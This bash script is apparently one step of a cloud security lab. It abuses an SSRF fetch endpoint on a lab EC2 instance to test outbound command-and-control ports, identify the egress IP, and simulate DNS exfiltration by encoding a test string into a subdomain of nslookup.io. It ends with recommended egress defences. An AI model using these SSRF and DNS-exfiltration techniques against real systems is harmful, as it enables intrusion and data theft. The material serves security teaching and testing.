#!/usr/bin/env bash
# =============================================================================
# 13_outbound_c2.sh — Outbound C2 Channel Availability Validation
# =============================================================================
# Purpose:
#   Using SSRF vulnerabilities, validate the availability of outbound C2
#   (Command & Control) channels from the EC2 instance. Determine how freely
#   an attacker who has compromised EC2 can communicate with external C2 servers.
#
# Learning points:
#   - Config A (Public): Direct external communication via IGW. EC2 Public IP is the source.
#     Outbound communication is possible on all ports, making C2 trivial.
#   - Config B (Private): External communication via NAT Gateway. NAT GW EIP is the source.
#     Communication is possible but consolidated through NAT GW EIP, making monitoring easier.
#     However, without egress filtering, C2 communication remains possible.
#
# Test contents:
#   Step 1: Multi-port outbound connectivity test (via SSRF)
#   Step 2: Outbound IP identification and comparative analysis
#   Step 3: DNS-based data exfiltration simulation
#   Step 4: Large data transfer test
#   Step 5: Overall assessment and recommendations
#
# Defenses:
#   - Domain allowlisting with VPC Network Firewall
#   - Block unauthorized domains with DNS Firewall
#   - Restrictive outbound SG rules (allow only 443 to specific CIDRs)
#   - Remove NAT GW + use VPC Endpoints only
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "13: Outbound C2 Channel Validation"

RESULT_FILE="13_outbound_c2.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Validating outbound C2 channel availability via SSRF${NC}"
echo ""

# ---------------------------------------------------------------------------
# Step 1: Multi-port outbound connectivity test
# ---------------------------------------------------------------------------
# portquiz.net is a legitimate service listening on all ports.
# Attackers often use non-standard ports for C2 server communication.
# Without egress filtering, all ports become reachable.
# ---------------------------------------------------------------------------
print_header "Step 1: Multi-Port Outbound Connectivity"

echo -e "${BLUE}[*] Checking outbound reachability on multiple ports via portquiz.net${NC}"
echo -e "${BLUE}[*] Testing typical ports used for C2 communication${NC}"
echo ""

result_text+="=== Step 1: Multi-Port Outbound Connectivity ==="$'\n'

# Target ports and descriptions
declare -a TEST_PORTS=("80" "443" "8080" "53" "4444" "1337" "6667" "9001")
declare -a PORT_DESCS=(
    "HTTP standard"
    "HTTPS standard"
    "Alt HTTP"
    "DNS port"
    "Metasploit default C2"
    "Hacker culture port"
    "IRC - classic C2"
    "Tor"
)

# Count successes on non-standard ports (other than 80, 443)
standard_port_success=0
nonstandard_port_success=0
total_success=0

for i in "${!TEST_PORTS[@]}"; do
    port="${TEST_PORTS[$i]}"
    desc="${PORT_DESCS[$i]}"

    # Access each portquiz.net port via SSRF
    response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=http://portquiz.net:${port}/" 2>/dev/null) || response=""

    if [[ -n "${response}" ]] && echo "${response}" | grep -qi "portquiz\|successfully\|port\|html"; then
        echo -e "  Port ${port} (${desc}): ${RED}OPEN${NC}"
        result_text+="Port ${port} (${desc}): OPEN"$'\n'
        total_success=$((total_success + 1))

        if [[ "${port}" == "80" || "${port}" == "443" ]]; then
            standard_port_success=$((standard_port_success + 1))
        else
            nonstandard_port_success=$((nonstandard_port_success + 1))
        fi
    else
        echo -e "  Port ${port} (${desc}): ${GREEN}BLOCKED/TIMEOUT${NC}"
        result_text+="Port ${port} (${desc}): BLOCKED/TIMEOUT"$'\n'
    fi
done

echo ""
echo -e "  Total open ports: ${total_success}/8"
echo -e "  Standard ports (80/443): ${standard_port_success}"
echo -e "  Non-standard ports: ${nonstandard_port_success}"
result_text+="Total open: ${total_success}/8 (standard: ${standard_port_success}, non-standard: ${nonstandard_port_success})"$'\n'

# If 3+ non-standard ports are open, conclude no egress filtering is in place
if [[ ${nonstandard_port_success} -ge 3 ]]; then
    print_vulnerable "No egress filtering — ${nonstandard_port_success} non-standard ports reachable (C2 communication trivial)"
    result_text+="Verdict: VULNERABLE — No egress filtering detected"$'\n'
elif [[ ${standard_port_success} -gt 0 && ${nonstandard_port_success} -eq 0 ]]; then
    print_blocked "Only standard ports (80/443) open — egress filtering may be in place"
    result_text+="Verdict: PARTIAL — Only standard ports allowed"$'\n'
else
    print_blocked "Outbound connections appear restricted"
    result_text+="Verdict: BLOCKED — Outbound connections restricted"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 2: Outbound IP identification
# ---------------------------------------------------------------------------
# Identify the EC2 outbound IP and analyze differences between Config A/B.
# Config A: EC2 Public IP is the source (via IGW)
# Config B: NAT GW EIP is the source (via NAT Gateway)
# In both configurations, traffic reaches the internet without restriction.
# ---------------------------------------------------------------------------
print_header "Step 2: Outbound IP Identification"

echo -e "${BLUE}[*] Identifying EC2 outbound IP and comparing with configuration${NC}"
echo ""

result_text+=$'\n'"=== Step 2: Outbound IP Identification ==="$'\n'

outbound_ip=""

# Verify via checkip.amazonaws.com
checkip_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=https://checkip.amazonaws.com" 2>/dev/null) || checkip_response=""
if echo "${checkip_response}" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; then
    outbound_ip=$(echo "${checkip_response}" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    echo -e "  checkip.amazonaws.com → ${BOLD}${outbound_ip}${NC}"
    result_text+="checkip.amazonaws.com: ${outbound_ip}"$'\n'
fi

# Cross-check via api.ipify.org
ipify_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=https://api.ipify.org" 2>/dev/null) || ipify_response=""
ipify_ip=""
if echo "${ipify_response}" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; then
    ipify_ip=$(echo "${ipify_response}" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    echo -e "  api.ipify.org     → ${BOLD}${ipify_ip}${NC}"
    result_text+="api.ipify.org: ${ipify_ip}"$'\n'
fi

# If outbound IP could not be determined
if [[ -z "${outbound_ip}" && -z "${ipify_ip}" ]]; then
    echo -e "${YELLOW}  Outbound IP identification failed${NC}"
    result_text+="Outbound IP: Could not determine"$'\n'
fi

# Verify IP consistency
if [[ -n "${outbound_ip}" && -n "${ipify_ip}" && "${outbound_ip}" == "${ipify_ip}" ]]; then
    echo -e "  ${GREEN}Both services report the same IP (consistent)${NC}"
    result_text+="Cross-check: Consistent"$'\n'
elif [[ -n "${outbound_ip}" && -n "${ipify_ip}" ]]; then
    echo -e "  ${YELLOW}IP mismatch: ${outbound_ip} vs ${ipify_ip} (possible load balancing)${NC}"
    result_text+="Cross-check: Mismatch (possible LB)"$'\n'
fi

echo ""

# Comparative analysis with Config A/B
NAT_GW_EIP=$(tf_output "nat_gw_eip")
effective_ip="${outbound_ip:-${ipify_ip}}"

if [[ -n "${effective_ip}" ]]; then
    if [[ "${CONFIG_MODE}" == "public" && -n "${APP_PUBLIC_IP}" ]]; then
        echo -e "  EC2 Public IP:  ${APP_PUBLIC_IP}"
        echo -e "  Outbound IP:    ${effective_ip}"
        if [[ "${effective_ip}" == "${APP_PUBLIC_IP}" ]]; then
            print_info "Config A: Outbound IP = EC2 Public IP (direct IGW routing)"
            result_text+="Config A: Outbound via IGW (EC2 Public IP = Outbound IP)"$'\n'
        else
            print_info "Config A: Outbound IP differs from EC2 Public IP"
            result_text+="Config A: Outbound IP differs from EC2 Public IP"$'\n'
        fi
    elif [[ "${CONFIG_MODE}" == "private" && -n "${NAT_GW_EIP}" ]]; then
        echo -e "  NAT GW EIP:    ${NAT_GW_EIP}"
        echo -e "  Outbound IP:    ${effective_ip}"
        if [[ "${effective_ip}" == "${NAT_GW_EIP}" ]]; then
            print_info "Config B: Outbound IP = NAT GW EIP (NAT Gateway routing confirmed)"
            result_text+="Config B: Outbound via NAT GW (EIP = Outbound IP)"$'\n'
        else
            print_info "Config B: Outbound IP differs from NAT GW EIP"
            result_text+="Config B: Outbound IP differs from NAT GW EIP"$'\n'
        fi
    fi

    # Outbound is unrestricted in both configurations
    print_vulnerable "Outbound traffic flows unrestricted — source IP identified as ${effective_ip}"
    result_text+="Verdict: Unrestricted outbound (source IP: ${effective_ip})"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 3: DNS-based data exfiltration simulation
# ---------------------------------------------------------------------------
# A technique that uses DNS queries themselves as a data exfiltration channel.
# By base32-encoding sensitive data and embedding it in subdomains,
# data can be exfiltrated via DNS (UDP 53) even when HTTP is filtered.
# DNS traffic passes unrestricted in most environments, making this dangerous.
# ---------------------------------------------------------------------------
print_header "Step 3: DNS-Based Data Exfiltration Simulation"

echo -e "${BLUE}[*] Validating whether DNS queries can be used as a data exfiltration channel${NC}"
echo -e "${BLUE}[*] Encoding sensitive data into subdomains and attempting DNS resolution${NC}"
echo ""

result_text+=$'\n'"=== Step 3: DNS-Based Data Exfiltration ==="$'\n'

# Base32-encode test payload (strip padding)
# In a real attack, stolen data would go here
test_payload="secret-data-leak"
encoded_payload=$(echo -n "${test_payload}" | base32 2>/dev/null | tr -d '=' | tr '[:upper:]' '[:lower:]') || encoded_payload="onxw2zjanfzsayjaon2he2lom4"

echo -e "  Original payload: ${test_payload}"
echo -e "  Base32 encoded:   ${encoded_payload}"
echo ""

result_text+="Test payload: ${test_payload}"$'\n'
result_text+="Encoded: ${encoded_payload}"$'\n'

# Attempt DNS resolution with encoded data as a subdomain
# In real C2, data is sent to subdomains of attacker-owned domains
# Here we check if DNS resolution succeeds for a random subdomain
dns_exfil_url="http://${encoded_payload}.nslookup.io/"
echo -e "${BLUE}[*] Accessing DNS-encoded URL via SSRF:${NC}"
echo -e "  URL: ${dns_exfil_url}"

dns_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${dns_exfil_url}" 2>/dev/null) || dns_response=""

if [[ -n "${dns_response}" ]] && ! echo "${dns_response}" | grep -qi "error\|failed\|could not\|timed out"; then
    echo -e "  ${RED}DNS resolution succeeded for arbitrary subdomain${NC}"
    result_text+="DNS exfil test (nslookup.io): Resolved"$'\n'
    print_vulnerable "DNS resolution succeeds for arbitrary domains — DNS exfiltration channel open"
else
    echo -e "  ${YELLOW}DNS resolution failed or timed out for nslookup.io test${NC}"
    result_text+="DNS exfil test (nslookup.io): Failed/Timeout"$'\n'
fi

echo ""

# Alternative test: access httpbin.org with a random subdomain
# Confirm the DNS resolver can resolve arbitrary domains
random_sub=$(head -c 8 /dev/urandom | xxd -p 2>/dev/null || echo "c2test$(date +%s)")
alt_dns_url="https://${random_sub}.example.com/"
echo -e "${BLUE}[*] Alternative: Testing DNS resolution for random subdomain${NC}"
echo -e "  URL: ${alt_dns_url}"

alt_dns_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${alt_dns_url}" 2>/dev/null) || alt_dns_response=""

# example.com has no wildcard DNS so this should fail
# However, DNS resolution is still attempted = DNS queries go external
echo -e "  Response: ${alt_dns_response:0:100}"
result_text+="Random subdomain test: ${alt_dns_response:0:100}"$'\n'

echo ""
echo -e "${BLUE}[*] Educational notes:${NC}"
echo -e "  - DNS queries themselves become data channels (data embedded in subdomains)"
echo -e "  - Even with HTTP filtering, DNS (UDP 53) is typically allowed"
echo -e "  - The attacker's DNS server reconstructs data from query logs"
echo -e "  - Defenses: DNS Firewall, VPC DNS configuration, domain allowlisting"

result_text+="Educational: DNS queries themselves become data channels"$'\n'

echo ""

# ---------------------------------------------------------------------------
# Step 4: Large data transfer test
# ---------------------------------------------------------------------------
# Evaluate C2 channel bandwidth. Without DLP (Data Loss Prevention) or
# content inspection, data of arbitrary size can be exfiltrated.
# ---------------------------------------------------------------------------
print_header "Step 4: Large Data Transfer Test"

echo -e "${BLUE}[*] Validating C2 channel data transfer capability${NC}"
echo -e "${BLUE}[*] Checking for DLP / content inspection${NC}"
echo ""

result_text+=$'\n'"=== Step 4: Large Data Transfer Test ==="$'\n'

# Append long query string to httpbin.org/get (data exfiltration bandwidth simulation)
long_query=$(python3 -c "print('A' * 500)" 2>/dev/null || printf 'A%.0s' {1..500})
echo -e "${BLUE}[*] Test 4a: Long query string (simulated data exfil via URL)${NC}"
get_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=https://httpbin.org/get?data=${long_query}" 2>/dev/null) || get_response=""

if [[ -n "${get_response}" ]] && echo "${get_response}" | grep -qi "args\|headers\|url"; then
    get_len=${#get_response}
    echo -e "  ${RED}Response received: ${get_len} bytes${NC}"
    result_text+="Long query string: Success (${get_len} bytes response)"$'\n'
else
    echo -e "  ${GREEN}Request failed or filtered${NC}"
    result_text+="Long query string: Failed/Filtered"$'\n'
fi

echo ""

# 1KB download test
echo -e "${BLUE}[*] Test 4b: Download 1KB payload${NC}"
dl_1k=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=https://httpbin.org/bytes/1024" 2>/dev/null) || dl_1k=""
dl_1k_len=${#dl_1k}
echo -e "  Response size: ${dl_1k_len} bytes (expected ~1024)"
result_text+="1KB download: ${dl_1k_len} bytes received"$'\n'

# 10KB download test
echo -e "${BLUE}[*] Test 4c: Download 10KB payload${NC}"
dl_10k=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=https://httpbin.org/bytes/10240" 2>/dev/null) || dl_10k=""
dl_10k_len=${#dl_10k}
echo -e "  Response size: ${dl_10k_len} bytes (expected ~10240)"
result_text+="10KB download: ${dl_10k_len} bytes received"$'\n'

echo ""

# Bandwidth limiting assessment
if [[ ${dl_1k_len} -gt 500 && ${dl_10k_len} -gt 5000 ]]; then
    print_vulnerable "No bandwidth limiting or content inspection — full data transfer possible"
    result_text+="Verdict: VULNERABLE — No DLP/content inspection detected"$'\n'
elif [[ ${dl_1k_len} -gt 0 || ${dl_10k_len} -gt 0 ]]; then
    print_info "Partial data transfer — some content may be filtered"
    result_text+="Verdict: PARTIAL — Some data transfer succeeded"$'\n'
else
    print_blocked "Data transfer blocked — content inspection may be in place"
    result_text+="Verdict: BLOCKED — Data transfer prevented"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 5: Overall assessment and recommendations
# ---------------------------------------------------------------------------
print_header "Step 5: C2 Channel Assessment Summary"

result_text+=$'\n'"=== Step 5: Summary ==="$'\n'

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  C2 Channel Assessment (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "  ${BOLD}Open Ports:${NC}        ${total_success}/8 (non-standard: ${nonstandard_port_success})"
echo -e "  ${BOLD}Outbound IP:${NC}       ${effective_ip:-N/A}"
echo -e "  ${BOLD}Data Transfer:${NC}     1KB=${dl_1k_len}B, 10KB=${dl_10k_len}B"
echo ""

result_text+="Open ports: ${total_success}/8 (non-standard: ${nonstandard_port_success})"$'\n'
result_text+="Outbound IP: ${effective_ip:-N/A}"$'\n'
result_text+="Data transfer: 1KB=${dl_1k_len}B, 10KB=${dl_10k_len}B"$'\n'

# Config A vs Config B comparative analysis
if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "  ${RED}Config A — C2 Risk Assessment:${NC}"
    echo -e "    - Direct communication via IGW: EC2 Public IP exposed as source"
    echo -e "    - Attacker can directly discover EC2 IP, making C2 targeting trivial"
    echo -e "    - No egress filtering: all ports and domains are reachable"
    echo -e "    - VPC Flow Logs can monitor but traffic is not consolidated to a single IP"
    echo -e "    - Establishing C2 communication is extremely easy"
    result_text+="Config A: High C2 risk — direct IGW, EC2 Public IP exposed"$'\n'
    print_vulnerable "Config A: C2 channel fully available via direct IGW"
else
    echo -e "  ${YELLOW}Config B — C2 Risk Assessment:${NC}"
    echo -e "    - Via NAT Gateway: all outbound traffic consolidated to a single EIP"
    echo -e "    - Easier to monitor, but no filtering is performed"
    echo -e "    - C2 communication remains possible from the attacker's perspective"
    echo -e "    - NAT GW connection tracking enables potential anomaly detection"
    echo -e "    - Easier to monitor than Config A, but does not prevent C2"
    result_text+="Config B: Moderate C2 risk — NAT GW consolidation aids monitoring but no filtering"$'\n'
    print_vulnerable "Config B: C2 channel available via NAT GW (monitoring easier, but not blocked)"
fi

echo ""
echo -e "  ${BOLD}Recommended Defenses (measures to block C2 communication):${NC}"
echo -e "    1. ${CYAN}VPC Network Firewall${NC}: Allow only permitted destinations via domain allowlisting"
echo -e "    2. ${CYAN}DNS Firewall${NC}: Block DNS resolution for unauthorized domains"
echo -e "    3. ${CYAN}Restricted Outbound SG${NC}: Allow only 443 to specific CIDRs"
echo -e "    4. ${CYAN}Remove NAT GW + VPC Endpoints${NC}: Eliminate external access entirely, allow only AWS services"
echo -e "    5. ${CYAN}VPC Flow Logs + GuardDuty${NC}: Detect anomalous outbound traffic patterns"
echo ""

result_text+="Recommended: Network Firewall, DNS Firewall, Restricted SG, VPC Endpoints only, GuardDuty"$'\n'

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "C2 Channel Assessment complete"
